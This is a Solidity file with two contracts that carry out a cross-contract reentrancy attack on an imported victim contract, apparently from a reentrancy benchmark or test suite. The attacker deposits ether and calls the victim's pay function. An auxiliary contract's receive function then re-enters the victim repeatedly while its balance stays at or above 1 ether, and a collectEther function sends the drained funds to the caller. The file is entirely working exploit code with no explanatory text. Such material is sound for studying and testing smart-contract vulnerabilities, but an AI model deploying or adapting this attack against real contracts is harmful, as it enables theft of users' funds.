// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../cross-contract/to-target/ToTarget_ree1.sol";

contract ToTarget_ree1_Attacker {
    ToTarget_ree1 victim;
    ToTarget_ree1_AttackerAux att2;
    uint counter = 10;

    constructor(address victimAddress) {
        victim = ToTarget_ree1(victimAddress);
        att2 = new ToTarget_ree1_AttackerAux();
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.pay(payable(address(att2)));
    }

    function reenter() public payable {
        if (address(victim).balance >= 1 ether)
            victim.pay(payable(address(att2)));
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ToTarget_ree1_AttackerAux {
    ToTarget_ree1_Attacker att1;

    constructor() {
        att1 = ToTarget_ree1_Attacker(msg.sender);
    }

    receive() external payable {
        att1.reenter{value: msg.value}();
    }
}
